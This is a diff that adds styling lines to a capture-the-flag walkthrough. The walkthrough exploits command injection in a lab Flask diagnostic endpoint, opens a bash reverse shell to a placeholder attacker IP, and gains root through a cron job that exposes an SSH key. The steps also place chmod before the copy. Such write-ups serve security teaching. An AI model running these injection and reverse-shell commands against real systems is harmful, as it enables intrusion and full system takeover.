@@ -14,12 +14,14 @@ image:
 ```bash
 nmap -sC -sV <TARGET_IP>
 ```
+{: .ms-4 }
 Port 8080 hosts a Flask HR diagnostic tool.
 
 ## Phase 2 — robots.txt Enumeration
 ```bash
 curl -s http://<TARGET_IP>:8080/static/robots.txt
 ```
+{: .ms-4 }
 It discloses a hidden `/dev-panel` route pointing back to the diagnostic tool at `/diag`.
 
 ## Phase 3 — Command Injection
@@ -27,17 +29,20 @@ The `/diag` endpoint pings a host using unsanitised input via `os.popen()`:
 ```bash
 curl -X POST http://<TARGET_IP>:8080/diag -d 'host=127.0.0.1; id'
 ```
+{: .ms-4 }
 Confirmed injection. Escalate to a reverse shell:
 ```bash
 nc -lvnp 4444
 curl -X POST http://<TARGET_IP>:8080/diag \
  --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"'
 ```
+{: .ms-4 }
 
 ## Phase 4 — User Flag
 ```bash
 cat /home/www-data/user.txt
 ```
+{: .ms-4 }
 
 ## Phase 5 — Privilege Escalation (Root Key Backup Cron)
 A root cron job runs every minute, copying root's SSH key to a world-readable path:
@@ -45,17 +50,20 @@ A root cron job runs every minute, copying root's SSH key to a world-readable pa
 cat /etc/crontab | grep key_backup
 cat /usr/local/bin/key_backup.sh
 ```
+{: .ms-4 }
 Wait for the cron to fire, then grab the key:
 ```bash
 cat /tmp/root_backup_key
 chmod 600 /tmp/rootkey; cp /tmp/root_backup_key /tmp/rootkey
 ssh -i /tmp/rootkey root@<TARGET_IP>
 ```
+{: .ms-4 }
 
 ## Phase 6 — Root Flag
 ```bash
 cat /root/root.txt
 ```
+{: .ms-4 }
 
 ## Flags
 
